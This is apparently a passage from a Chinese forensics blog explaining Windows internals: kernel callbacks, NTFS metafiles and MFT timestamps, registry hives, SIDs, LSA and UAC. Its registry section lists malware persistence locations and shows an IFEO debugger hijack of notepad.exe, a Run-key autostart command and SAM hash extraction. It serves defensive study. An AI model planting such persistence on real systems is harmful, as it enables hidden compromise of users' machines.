功能：当线程被创建或销毁时触发 用途：检测线程注入、远程线程创建 映像加载相关回调 PsSetLoadImageNotifyRoutine 功能：当模块（如EXE、DLL）被加载到进程时触发 用途：监视DLL是否注入或加载非法模块 注册表操作回调 CmRegisterCallback/CmRegisterCallbackEx 功能：在注册表被访问（读写、删除等）时触发 用途：拦截修改注册表、保护启动项 文件系统监控回调 FsRtlRegisterFileSystemFilterCallbacks 功能：文件系统过滤驱动使用的回调注册接口 用途：监视文件访问、隐藏或加密文件等（如勒索软件防护、杀毒软件） 电源管理与关机回调 IoRegisterShutdownNotification 功能：注册系统关机前通知 用途：清理资源、保存数据、记录日志 PoRegisterPowerSettingCallback 功能：注册电源策略变化回调（如睡眠、唤醒） 用途：管理节能策略或唤醒唤醒设备 蓝屏 (BugCheck) 回调 KeRegisterBugCheckCallback 功能：系统蓝屏前调用，允许驱动记录崩溃状态 用途：记录调试信息、保存崩溃快照 Windows事件通知类回调 ExRegisterCallback 功能：内核模块之间广播通知 用途：驱动之间共享事件信息（如热插拔、电池状态） 网络相关回调 FwpsCalloutRegister 功能：用于网络过滤和处理框架Windows Filtering Platform注册网络流量过滤回调 用途：监控/拦截网络通信（如防火墙、DLP系统） NdisRegisterProtocolDriver 功能：注册协议驱动的接收/发送回调函数 用途：网络监控、抓包、VPN实现等 安全与对象管理回调 ObRegisterCallbacks 功能：监控对象句柄操作，如进程句柄、线程句柄 用途：防止进程被调试、注入、终止（常用于反作弊或病毒保护） ","date":"2025-07-21T12:18:54+08:00","image":"http://picture.928330.xyz/typora/e9431f0af289cbee8312463acd321a66.jpg","permalink":"https://blog.928330.xyz/p/windows%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%E4%B8%8B/","title":"windows相关知识总结（下）"},{"content":"写下这篇文章的原因是因为最近在学习电子取证，使用Volatility多少得看得懂输出才行\n现在只是大概的了解，如果后续有时间，会把每一个板块都单独拿出来学习的\n嗯，如果有时间的话\n下篇看这里 -\u0026gt; windows相关知识总结（下） NTFS文件系统 什么是NTFS NTFS，全称New Technology File System，是自WindowsNT以来微软所有现代操作系统的标准文件系统\n在NTFS卷上，一切皆文件\n这不仅包括我们日常所见的普通文件和目录，用于描述和管理文件系统自身的元数据也同样被组织成一系列特殊的文件，这种设计极大地增强了文件系统的灵活性和可恢复性\n核心元文件 这是NTFS文件系统内部使用的一组以$开头的特殊隐藏文件，用于维护整个文件系统的结构、状态和完整性\n它们不像普通用户文件那样可见或可操作，而是被NTFS在后台自动创建和管理，保存着关于文件、目录、磁盘空间、日志、安全信息等的元数据\n大致结构如下：\nNTFS Root ├── $Mft ├── $MftMirr ├── $LogFile ├── $Volume ├── $Bitmap ├── $BadClus ├── $AttrDef ├── $Secure ├── $Extend │ ├── $Quota │ ├── $ObjId │ ├── $Reparse │ └── $UsnJrnl ├── $UpCase ├── $Boot └── ... $Mft MFT，即主文件表，是NTFS文件系统的核心数据库\n它本身是一个特殊文件，由一系列固定大小的文件记录（通常为1024字节）组成\n卷上的每一个文件和目录都至少对应MFT中的一个文件记录，该记录包含一个头部和一系列描述文件所有信息的属性\n它的主要用途是作为整个卷的索引目录\n操作系统进行任何文件操作（如查找、读取、写入、权限检查）时，都必须首先查询$Mft以获取文件的元数据，包括时间戳、大小、权限以及数据在磁盘上的物理位置\n我们后面会详细说明它：[MFT](#NTFS的关键结构 —— 主文件表MFT)\n$MftMirr MftMirr是主文件表的一个部分备份或镜像\n它通常只包含Mft最开头的几个关键文件记录（例如描述Mft自身、LogFile等元文件的记录）\n为了提高容灾能力，它在物理磁盘上的存储位置通常远离Mft\n其唯一的用途是文件系统恢复\n当Mft文件的起始部分发生损坏导致文件系统无法挂载时，操作系统可以利用MftMirr来定位关键的元文件，从而为修复工具提供恢复文件系统的可能性\n$LogFile 该文件是NTFS日志记录功能的物理载体\n它遵循预写式日志模型，即在对文件系统元数据进行任何实际更改之前，都会先将描述该操作的事务日志记录写入LogFile\n它的核心用途是保证文件系统的一致性和可恢复性\n在系统意外崩溃或断电后，NTFS驱动程序可以通过检查LogFile，回滚未完成的事务或完成已记录但未写入的事务，从而防止文件系统结构损坏，也可以用来恢复最近的文件操作历史\n$Volume 这是一个存储卷级别信息的元文件\n它的主要属性中包含了整个卷的元数据，例如卷标、NTFS版本号以及卷的状态标志位\n操作系统使用此文件来识别卷的属性\n其中脏位(Dirty Bit)尤为重要，表示某个数据结构或内存页是否已经被修改过但尚未写回到磁盘或永久存储中，系统在启动时会检查这个标志，如果发现上次关机是“非正常”的，就会触发chkdsk等磁盘检查工具来确保卷的一致性\n$Bitmap Bitmap是一个位图文件，它的每一个比特位都精确地对应着卷上的一个物理簇\n比特位的值（0或1）用于标记其对应的簇是空闲的还是已被占用\n它被文件系统用于高效地管理磁盘空间分配\n当需要为新文件写入数据时，系统会查询Bitmap来快速找到连续的空闲簇\n当文件被删除时，其占用的簇对应的比特位会被重置为0（空闲）\n$BadClus 该文件标记了卷上所有已被检测为物理损坏或不可靠的坏簇\n它以一个稀疏文件的形式存在，其$DATA属性中包含了所有坏簇的位置列表\n它的作用是防止数据丢失\n文件系统在分配磁盘空间时，会避开BadClus文件中标记的所有簇，以确保用户数据不会被写入到这些已知的物理损坏区域\n$AttrDef AttrDef是属性定义表，相当于MFT文件记录的模式或模板定义文件\n它以结构化的形式，列出了NTFS文件系统支持的所有属性类型及其元数据，包括它们的名称、数字ID以及默认特性（如是否可以非常驻）\n此文件由NTFS驱动程序在内部使用，用于在解析任何MFT文件记录时，都能正确地识别和解释其中的各种属性结构，保证了MFT的结构完整性和可扩展性\n$Secure 这是一个集中存储卷上所有文件和目录的安全描述符的数据库\nNTFS为了节省空间，并不会在每个MFT记录中都存一份完整的安全描述符（包含用户SID、权限ACL等），而是将唯一的描述符存储在Secure文件中，并赋予其一个ID\n其他MFT记录只需引用这个ID即可\n主要用途是提高权限验证效率和降低安全信息的存储冗余\n通过共享安全描述符，可以显著减小MFT的体积，并允许系统更高效地缓存和查询权限信息\n$Extend Extend本身是一个目录，它作为NTFS高级功能模块的扩展容器，其下包含了多个用于支持特定功能的元文件\n它为磁盘配额、对象ID、重解析点和变更日志等高级功能提供结构化的存储位置\n它包含以下重要子文件：\n$Quota 用于记录和管理每个用户在该卷上的磁盘空间使用限制\n它以包含用户SID、空间使用量、警告阈值和硬限制等信息的结构化记录进行存储\n实现Windows的磁盘配额功能，允许管理员为不同用户设置不同的磁盘空间上限\n$ObjId 为一个卷上的每个文件分配一个全局唯一的对象标识符（GUID），以便快速查找\n主要被分布式链接跟踪等系统服务使用，确保即使用户将文件移动或重命名，依赖该文件的快捷方式等依然能找到它\n$Reparse 记录了卷上所有设置了重解析点的文件或目录\n重解析点允许一个文件或目录的访问被一个特定的驱动程序拦截并进行特殊处理\n它是实现多种高级文件系统功能的基础，例如符号链接、目录联接、卷挂载点以及OneDrive的占位符文件等\n$UsnJrnl 其全称为Update Sequence Number Journal，即更新序列号日志\n它是一个高效率的日志，记录了卷上所有文件的所有变更事件，如创建、删除、写入、重命名、权限修改等\n它的主要用户是需要监控文件系统变化的应用程序，如增量备份软件、文件同步服务、以及安全审计工具。在取证分析中，它是还原文件详细活动历史的最重要数据源之一\n$Boot 该文件是卷的引导扇区的一个精确副本\n它包含了BIOS参数块，详细描述了该分区的物理布局，以及用于启动操作系统的初始引导代码\n其核心用途是在计算机启动时，由BIOS/UEFI读取并执行，以加载操作系统的引导加载程序\n同时，NTFS驱动程序也需要读取它来理解卷的几何结构\n$UpCase 该文件包含了一个完整的、将所有Unicode字符映射到其对应大写形式的转换表，用于实现NTFS文件名大小写不敏感但大小写保留的特性\n当进行文件名比较或查找时，文件系统会调用这个映射表来确保file.txt和FILE.TXT这样的大小写被视为同一个文件\n$Recycle.Bin 这虽然不是一个元数据文件，但它是一个与文件系统紧密相关的、重要的系统隐藏目录\n当用户通过图形界面删除文件时，文件并不会被物理删除，而是其MFT记录被修改，使其被移动到Recycle.Bin目录下某个以用户SID命名的子目录中，并被重命名，同时一个索引文件会记录下原始的文件名和路径\n它为用户提供回收站功能，允许恢复被误删除的文件\nNTFS的关键结构 —— 主文件表MFT 什么是MFT MFT的全称是MasterFileTable ，即主文件表，它是NTFS文件系统的核心\n如果NTFS格式的硬盘分区是图书馆，那么MFT就是这个图书馆的总目录卡片索引柜\n这个索引柜本身也是一个特殊的文件，名为$MFT，里面存放着一张张的卡片，每一张卡片都详细记录了图书馆里某一本书（即硬盘上的一个文件或文件夹）的所有信息\n没有这个总目录，操作系统就无法找到、访问或管理分区上的任何文件\nMFT 的结构 文件记录 MFT 由一系列固定大小的文件记录构成，每个记录都有一个唯一的编号，从 0 开始\n记录的前部是固定的头结构FILE_RECORD_SEGMENT_HEADER，用于描述该记录的状态（如是否在使用中）\n其余部分则由多个可变长度的属性组成\n核心属性 每个文件记录内部，由多个不同类型的属性来完整描述一个文件，下面介绍几个关键属性：\n$STANDARD_INFORMATION (0x10)\n这是存储文件的核心元数据，包括安全描述符、所有者ID，以及一组MACE时间戳\n这组时间戳与文件内容的改变紧密相关，被认为是最稳定的时间戳，其创建时间通常反映了文件数据首次被写入的时间，是构建原始时间线的基准，常被称为MAC(B)时间\n1. M - Modified (修改时间) —— 文件内容最后一次被修改的时间\n当打开一个文件，编辑其内容并保存后，这个时间戳就会更新\n创建新文件时，它的修改时间与创建时间相同\n2. A - Accessed (访问时间) —— 文件内容最后一次被访问读取的时间\n理论上，只要一个程序打开并读取了文件内容（即使没有修改），这个时间戳就应该更新。\n但是在现代Windows系统中（Vista及之后），为了提高性能，默认情况下访问时间的更新是禁用的，因此这个时间戳的参考价值有限，除非管理员手动开启了该功能\n3. C - Created (创建时间) —— 文件被创建在这个文件系统上的时间\n当一个文件从一个地方复制到另一个地方时，新文件的“创建时间”是复制操作发生的时间，而不是原始文件的创建时间\n但当文件被移动到同一卷（例如从C盘的一个文件夹移动到另一个文件夹）时，创建时间通常不会改变\n4. E - Entry Modified (MFT记录变更时间) —— 该文件在MFT中的记录本身最后一次被修改的时间\n任何导致文件元数据发生变化的操作都会更新这个时间戳，例如文件重命名、文件大小改变、权限修改等。当然，修改文件内容（更新Modified时间）也同样会更新这个时间戳\n$FILE_NAME (0x30)\n包括存储文件名、父目录的文件记录号、文件大小，以及另一组独立的MACE时间戳\n这组时间戳反映的是文件名属性本身的状态，当文件被创建、移动或重命名时，这组时间戳会被更新\n通过对比$STANDARD_INFORMATION和$FILE_NAME两组时间戳的差异，可以用来判断文件是原地创建还是从别处复制而来\n一个文件记录可以有多个$FILE_NAME属性，以支持长文件名、MS-DOS兼容的8.3短文件名与硬链接\n这两组时间具体变化情况如下表(访问时间在现代Windows系统中默认禁用更新，因此假设其始终不变)：\n操作 属性 创建时间 (C) 修改时间 (M) 访问时间 (A) MFT变更时间 (E) 原地创建文件 $STANDARD_INFORMATION ✅ ✅ ❌ ✅ $FILE_NAME ✅ ✅ ❌ ✅ 修改文件内容 $STANDARD_INFORMATION ❌ ✅ ❌ ✅ $FILE_NAME ❌ ✅ ❌ ✅ 复制文件 $STANDARD_INFORMATION ❌ (继承) ❌ (继承) ❌ ✅ $FILE_NAME ✅ ✅ ❌ ✅ 移动文件 (同一分区) $STANDARD_INFORMATION ❌ ❌ ❌ ❌ $FILE_NAME ❌ ❌ ❌ ✅ 重命名文件 $STANDARD_INFORMATION ❌ ❌ ❌ ❌ $FILE_NAME ❌ ❌ ❌ ✅ 读取文件 $STANDARD_INFORMATION ❌ ❌ ❌ ❌ $FILE_NAME ❌ ❌ ❌ ❌ $DATA\n其中存储着文件的实际数据，其存储方式有两种：\n常驻数据（存内容）：如果文件非常小（通常小于约700字节），其全部数据会直接存储在 MFT 记录内部的$DATA属性中，无需到磁盘的其他地方去寻找 非常驻数据（存指针）：如果文件较大，$DATA属性中存储的则是数据运行/簇列表，这是一系列指针，详细描述了该文件的数据流在磁盘上占用了哪些不连续的簇 $ATTRIBUTE_LIST\n它包含一个指针列表，指向存储该文件其他属性的额外MFT记录\n当一个文件的所有属性无法在一个MFT记录中存下时（例如，文件有极多的硬链接或高度碎片化），系统会创建这个属性\nMFT与文件恢复 当一个文件被删除时，NTFS的操作是：\n在 MFT 中找到该文件对应的记录，并将其头部的in-use标志位置为0（未使用），记录本身的内容并不会被立即清除 在$Bitmap文件中（跟踪卷上所有簇使用情况的元文件），将该文件数据所占用的磁盘簇标记为未分配 这种标记删除机制使得数据恢复成为可能，恢复的成功率取决于MFT记录和原始数据簇是否被后续写入的新文件所覆盖\n这就导致下面几种情况：\n恢复场景 MFT记录状态 文件数据状态 可恢复性 最佳情况 完好 完好 完美恢复：文件名、元数据和文件内容全部可以恢复 一般情况 完好 部分被覆盖 部分恢复：文件名和元数据可恢复，但文件内容不完整或已损坏 情况三 完好 完全被覆盖 仅元数据恢复：只能恢复文件名、大小、时间戳等“档案”信息，文件内容永久丢失 最差情况 被覆盖 完好或部分完好 部分恢复：文件名和元数据永久丢失，但文件内容本身可以从磁盘的“未分配空间”中被恢复出来 常驻数据 完好 数据在MFT记录中 完美恢复：由于文件数据本身就存储在MFT记录中，只要MFT记录未被覆盖，即使磁盘数据区被重写，文件内容依然可以被完整恢复 注册表 什么是注册表 Windows注册表是整个操作系统的核心数据库，是一个庞大、复杂的层级式数据库\n它存储了操作系统和几乎所有应用程序运行所需的全部配置信息，从硬件驱动的设置、软件的安装路径，到桌面壁纸的图片位置，所有的一切都记录在其中\n如何打开注册表 我们可以使用注册表编辑器：\nwin+R打开运行窗口，输入regedit，Shift+Ctrl+Enter以管理员模式打开\n除了直接看注册表，它还有一个简单易用的用户界面——本地组策略，只不过家庭版通常是没有的：\nwin+R打开运行窗口，输入gpedit.msc打开\n注册表的结构 要分析注册表，我们必须理解它的双层结构：物理层和逻辑层\n注册表的配置单元（物理层 - HIVE） 在Windows9x中，注册表文件的数据信息保存在system.dat（系统）和user.dat（用户）中\n但到了WindowsNT，注册表并不是一个单一的大文件，而是由一组名为配置单元 (Hive)的独立文件组成的\n这些是存储在硬盘上的真实文件，在系统运行时被加载到内存中，下面是几个常见的：\nSYSTEM 存储核心的系统硬件配置、服务列表、启动设置\n路径：C:\\Windows\\System32\\config\\SYSTEM\nSOFTWARE 存储操作系统和已安装软件的全局配置信息\n路径：C:\\Windows\\System32\\config\\SOFTWARE\nSAM 安全帐户管理器(Security Account Manager)，存储本地用户的账户信息和密码哈希\n路径：C:\\Windows\\System32\\config\\SAM\nSECURITY 存储系统范围内的安全策略和用户权限分配\n路径：C:\\Windows\\System32\\config\\SECURITY\nNTUSER.DAT 每个用户都有一个独立的，存储该用户的个性化设置，如桌面背景、程序历史记录等\n路径：C:\\Users\\\u0026lt;用户名\u0026gt;\\NTUSER.DAT\nUsrClass.dat 同样是每个用户一个，存储文件关联和COM类注册信息\n路径：C:\\Users\\\u0026lt;用户名\u0026gt;\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat\nAmcache.hve 记录了近期在该系统上运行过的应用程序及其路径、安装时间等信息\n路径：C:\\Windows\\appcompat\\Programs\\Amcache.hve\nBCD 存储了系统的启动菜单和配置信息，决定了计算机如何启动操作系统\n没有扩展名，文件名就是BCD，即Boot Configuration Data\n路径：通常位于系统启动分区，例如 \\Boot\\BCD\n注册表的根键（逻辑层 - HKEY） regedit.exe的HKEY_...开头的顶级文件夹，是操作系统为了方便管理而创建的逻辑视图，被称为根键\n这些根键将不同的Hive文件组合在一起，形成树状结构\n每一个根键都是一个项（文件夹），下面有着各种项，项里又定义着各种键值对（内容）\n注册表包括以下五个根键，其中只有HKLM和HKU是真实映射Hive的，其余都是它们的视图：\n1. HKEY_CLASSES_ROOT（HKCR） 它负责管理文件的类型关联（决定双击文件用什么程序打开）和 COM 组件的注册信息\n它是虚拟的、合并而成的视图，由HKLM\\SOFTWARE\\Classes和HKCU\\Software\\Classes这两个键合并而成\n2. HKEY_CURRENT_USER（HKCU） 该根键包括当前登录用户的配置信息，包括环境变量，个人程序以及桌面设置等\n它实际上是指向HKEY_USERS下当前用户SID的一个快捷方式，其内容来自当前用户的NTUSER.DAT文件\n3. HKEY_LOCAL_MACHINE（HKLM） 该根键包括本地计算机的系统信息，包括硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息\n它主要映射了SYSTEM，SOFTWARE，SAM，SECURITY等Hive\n4. HKEY_USERS（HKU） 该根键包括计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问，告诉系统当前用户使用的图标，激活的程序组，开始菜单的内容以及颜色，字体\n它的每个子项是一个用户的SID，此外还有.DEFAULT子项，是系统为新用户创建账户时的配置模板\n5. HKEY_CURRENT_CONFIG（HKCC） 该根键包括当前硬件的配置信息，其内容**完全指向（或映射自）**以下这个更深的注册表路径：\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Hardware Profiles\\Current\n常用注册表项 持久化机制 这是恶意软件实现开机自启、确保自身不被清除最常用的位置\n开机自启（Run/RunOnce） 路径： HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run (对所有用户生效) HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (只对当前用户生效) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run (策略控制的启动项) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run 功能：最经典、最直接的自启动位置写入这里的程序会在用户登录或系统启动时自动执行。 关注点：检查所有这些Run键下是否有指向非标准目录（如Temp、AppData）的可执行文件，或者是否有名字可疑的启动项 系统服务（Services） 路径：HKLM\\SYSTEM\\CurrentControlSet\\Services\\ 功能：将程序注册为系统服务，可以在后台运行，权限高，更隐蔽 关注点： 可疑服务名：是否有随机、无意义或拼写错误的服务名称 ImagePath：正常服务（如svchost）的ImagePath是否被篡改为指向恶意程序 FailureCommand：检查服务失败后执行的命令是否被设置为恶意程序 登录辅助程序（Winlogon） 路径：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 功能：Winlogon.exe是负责用户登录的核心进程 关注点: Userinit：默认值应为C:\\Windows\\system32\\userinit.exe,。检查末尾是否有逗号，以及后面是否跟了其他恶意程序的路径（用逗号分隔） Shell：默认值应为explorer.exe，如果被修改，意味着用户的整个桌面环境都被替换了 调试器（Image File Execution Options，IFEO） 路径：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\n功能：用于在程序启动时附加调试器\n关注点：攻击者会创建一个以正常程序命名（如notepad.exe）的子项，然后在其中添加一个名为Debugger的键值，指向自己的恶意程序：\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe] \u0026#34;Debugger\u0026#34;=\u0026#34;C:\\\\Path\\\\To\\\\EvilDebugger.exe\u0026#34; 这样，每当用户尝试运行记事本时，系统会优先运行那个恶意的调试器，而真正的记事本根本不会启动\n也可以用于阻止程序运行，如果调试器不存在，系统找不到指定的.exe，程序就无法启动\n图像环境DLL（AppInit_DLL） 路径：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows 功能：允许将一个或多个DLL注入到几乎所有加载了user32.dll的进程中 关注点：检查**AppInit_DLLs**这个键值是否为空，任何被列在这里的DLL都会被广泛注入，是恶意软件实现全局监控的常用手段 COM组件（CLSID） 路径：HKCR\\CLSID\\ 功能：存储系统中所有COM组件类ID（CLSID）的信息 关注点：检查InprocServer32等子项的默认值，看其指向的 DLL 路径是否可疑 用户账户与凭证 本地用户信息（SAM） 路径：HKLM\\SAM\\SAM\\Domains\\Account\\Users\n功能：存储本地用户的账户名、SID、以及最重要的密码哈希\n关注点：SAM受到严格保护，无法直接读取，但可以通过内存取证工具（如 hashdump）或离线分析SAM和SYSTEM文件来提取密码哈希\n检查Names子键可以发现所有本地账户，包括可能被隐藏的账户\n用户配置文件列表（ProfileList） 路径：HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList 功能：记录了本机上所有用户账户的 SID 以及其个人文件夹（Profile）的路径。 关注点：这是将SID和用户名对应起来的关键，可以发现系统上曾经存在过但已被删除的用户账户痕迹 用户活动痕迹 程序执行历史（UserAssist） 路径：HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist 功能：记录用户通过图形界面（点击图标）运行程序的历史，包括运行次数和最后运行时间 取证关注点：还原用户操作的关键，可以清晰地看到用户在特定时间点运行了哪些程序 最近打开的文档（RecentDocs） 路径：HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs 功能：记录用户最近打开过的文档和访问过的文件夹 关注点：了解用户最近处理了哪些文件，可能会发现恶意文档（如带宏的Word）或攻击者留下的工具 文件夹打开记录（BagMRU） 路径： HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU（新版本，主要使用） HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU （旧版本，不太使用） 功能：记录用户曾经打开过的所有文件夹，每一项代表一个用户访问过的文件夹，每个键的值（如 REG_BINARY数据）是一个内部结构（MRU记录+路径+配置引用），其中包含路径信息，但不是直接可见的字符串 关注点：它可以揭示出用户曾经访问过但现在可能已不存在的文件夹，包括网络共享、移动设备上的文件夹，同级目录下的Bags会记录文件夹的具体视图设置 USB设备使用历史（USBSTOR） 路径：HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR 功能：记录所有曾接入本机的U盘、移动硬盘等USB存储设备的厂商、型号和唯一的序列号 关注点：可以确定是否有未经授权的U盘接入，并可将特定U盘与数据泄露或恶意软件植入事件关联起来 系统与网络信息 网络接口与历史IP (Interfaces) 路径：HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\ 功能：记录本机所有网络接口（有线网卡、无线网卡）的配置信息，包括历史上曾经获取过的IP地址、子网掩码、网关和DNS服务器 关注点：可以确定机器在不同时间点的网络环境，对于追踪内网漫游或确认C2连接时的源IP地址至关重要 最后关机时间 (ShutdownTime) 路径：HKLM\\SYSTEM\\CurrentControlSet\\Control\\Windows\\ShutdownTime 功能：记录了系统最后一次正常关机的时间 关注点：帮助确定系统事件发生的时间窗口 时区信息 (TimeZoneInformation) 路径：HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation 功能：记录本机配置的时区 关注点：时间线分析的基准，所有从日志和文件系统中提取的时间戳都必须根据这个时区进行校正，才能得到准确的绝对时间 使用命令行编辑注册表 reg命令的基本结构 reg \u0026lt;操作\u0026gt; \u0026lt;注册表项路径\u0026gt; [参数] 增/改(add) 添加新项（文件夹）\n在Run键下创建一个名为MyApp的新项：\nreg add \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyApp\u0026#34; 添加/设置键值（内容）\n/v：指定键值名\n/t：指定类型\n类型 全称 存储内容 REG_SZ 字符串值 人类可读的文本，如路径、名称、描述 REG_DWORD 32位数值 一个整数，通常用作是/否的标志或简单数字配置 REG_BINARY 二进制值 任意的、非结构化的原始字节数据 /d：指定数据\n/f：如果键值已存在，强制覆盖而不提示\n在Run键下创建一个名为Pentestlab的自启动程序：\nreg add \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; /v Pentestlab /t REG_SZ /d \u0026#34;C:\\tools\\pentestlab.exe\u0026#34; 删 (delete) 删除键值\n/v：指定要删除的键值名 /f：强制删除，不进行确认提示 删除刚才创建的Pentestlab启动项：\nreg delete \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; /v Pentestlab /f 删除整个项（及其所有子项和键值）\n删除刚才创建的MyApp项：\nreg delete \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyApp\u0026#34; /f 查 (query) 查询项下的所有内容\nreg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; 这条命令会列出Winlogon这个项下所有的子项和键值\n查询一个具体的键值\n/v：指定要查询的键值名 reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; /v Userinit 递归查询所有子项和键值\n/s：递归查询所有子项和键值 reg query \u0026#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\u0026#34; /s Windows安全机制 安全主体与身份验证 在介绍Windows安全机制之前，我们必须先理解两个基本概念：安全主体和身份验证\n安全主体 安全主体是指在Windows操作系统中能够被识别和进行身份验证的任何实体\n它不仅包括人类用户，还包括以下内容：\n用户账户：包括本地用户（如Administrator）和域用户（如CONTOSO\\jdoe） 计算机账户：加入域的计算机，如WORKSTATION-01$ 安全组：如Administrators组、Everyone组等 系统内置账户：例如SYSTEM、Local Service、Network Service 进程或线程：在特定安全上下文中运行的进程或线程 简单来说，任何需要被系统识别以授予权限的对象，都是一个安全主体\n完整性级别 完整性级别是安全主体的一个属性，用于防止低权限程序访问高权限资源\n主要级别有：\n低完整性级别（如Internet Explorer保护模式） 中等完整性级别（普通用户程序） 高完整性级别（管理员权限进程） 系统完整性级别（操作系统核心进程） 完整性级别形成了额外的访问限制层\n身份验证 身份验证是核实安全主体是否确实是其所声称身份的过程，主要回答“你是谁？”这个问题\n身份验证确保访问者不是冒名顶替者，常见方式包括密码核对、智能卡认证、生物识别等\n需要注意的是，身份验证与授权是不同的概念，身份验证是授权的前提，但本身不等同于授权\nSID 什么是SID SID全称Security Identifier，即安全标识符，就是操作系统为每一个安全主体分配的、一个全局唯一且不可变的号码\n唯一性：一个 SID 只会分配给一个安全主体，即使这个账户被删除，它的 SID 也不会被重新分配给新账户 不变性：账户可以改名，但它的 SID 永远不变 内部标识：用户习惯使用用户名来识别账户，但Windows内核只认SID SID如何工作 SID是Windows安全模型的核心\n创建与存储：当一个账户或组被创建时，本地安全机构（LSA）或域控制器会为其生成一个唯一的 SID，并将其存储在安全数据库中（本地账户存在注册表的SAMHive中，域账户存在活动目录中）\n生成访问令牌：当一个用户成功登录时，系统会为其创建一个访问令牌 (Access Token)，这个令牌就像一张临时通行证，里面包含了该用户的SID、该用户所属所有组的SID、以及该用户拥有的所有特权\n访问控制：当该用户尝试访问一个资源（如文件或文件夹）时，系统会拿出用户的访问令牌，将其中的SID列表与资源的访问控制列表（ACL）进行比对，以决定是否授予访问权限\nSID的结构 一个典型的、完整的 SID 结构如下：\nS - 修订级别 - 颁发机构 - 域标识符 - 相对ID(RID) 我们以一个例子来分解： S-1-5-21-2127521184-1604012920-1887927527-500\nS：固定前缀\n表明这是一个SID\n1：修订级别\n目前所有SID的版本都是1\n5：标识符颁发机构\n这里的5代表 NT Authority，即由WindowsNT系统安全机构颁发，这是最常见的一种\n21-2127521184-1604012920-1887927527：域或本地计算机标识符\n这是一串唯一的数字，代表创建这个SID的计算机或域，同一台电脑上的所有本地账户都会共享这一串数字\n500：相对ID (RID)\n这是 SID 的最后一部分，它在上述域标识符范围内是唯一的，真正用来区分不同的账户\nWindows 为一些内置账户预留了固定的 RID：\n500：Administrator（内置管理员账户） 501：Guest（来宾账户） 普通用户通常从 1000 或 1001 开始递增 众所周知的SID 除了上述每个账户独有的SID，Windows还预定义了一些特殊的、固定的 SID\n它们在所有Windows系统上都具有相同的值和含义，代表了一些内置的身份或通用组\nSID 通用名称 说明 S-1-5-18 Local System 本地系统账户，Windows系统中的最高权限 S-1-5-32-544 Administrators 本地管理员组，属于这个组的成员都拥有管理员权限 S-1-1-0 Everyone 所有用户组，范围最广，包括已登录的用户和匿名用户 S-1-5-11 Authenticated Users 已认证用户组，代表所有通过了身份验证的账户 S-1-5-2 Network 任何通过网络登录的用户 S-1-5-6 Service 任何以服务身份登录的实体 S-1-5-7 Interactive 任何通过直接在本地登录的用户 LSA 什么是LSA LSA，全称本地安全机构 (Local Security Authority)\n它是一个受保护的Windows子系统，核心职责是在单台计算机上强制执行系统的安全策略\n它是Windows 安全模型的中心，负责验证用户身份、管理用户权限并生成安全审计日志\nLSA的用户模式组件体现在一个名为lsass.exe的关键系统进程中，是维持操作系统安全运行的必要进程，任何对lsass.exe的终止都会导致系统在短时间内强制关机并提示安全错误\n访问令牌 访问令牌Access Token是由LSA创建的内核管理对象，描述进程或线程的安全上下文\n包含的内容 用户SID：标明主体身份\n组SID列表：确定主体所属的所有安全组\n特权列表：决定主体可执行的系统级特殊操作，如SeDebugPrivilege\n工作流程 当用户登录后，启动的每个进程都会继承该用户访问令牌的副本\n当进程尝试访问受保护资源时，内核的安全引用监视器（Security Reference Monitor，SRM）会取出进程访问令牌中的SID列表，与资源的访问控制列表（Access Control List，ACL）比较，决定是否允许或拒绝访问\n用户账户控制 用户账户控制（User Account Control，UAC）是基于访问令牌的“双令牌”机制\n传统的Windows系统中，用户经常以管理员权限登录，这导致所有程序默认拥有高权限，增加了系统被攻击和破坏的风险\n而UAC通过限制默认权限，减少系统受攻击面\n当管理员账户登录系统时，系统为其创建两个访问令牌：\n标准访问令牌（受限令牌）：用于默认运行的应用程序，权限受限，防止程序执行高风险操作 完整访问令牌（管理员令牌）：包含完整管理员权限，但只在用户明确授权时使用 普通用户账户只拥有标准令牌，无法提升权限\n当用户启动需要管理员权限的程序或操作（比如安装软件）时，系统会弹出UAC提示，要求用户确认操作：\n管理员账户：弹出提示框，用户确认后程序使用完整访问令牌运行 标准账户：需要输入管理员账户的用户名和密码以获得权限提升 这保证了系统操作必须经过用户授权，避免恶意软件自动提升权限\nLSA的功能 用户认证 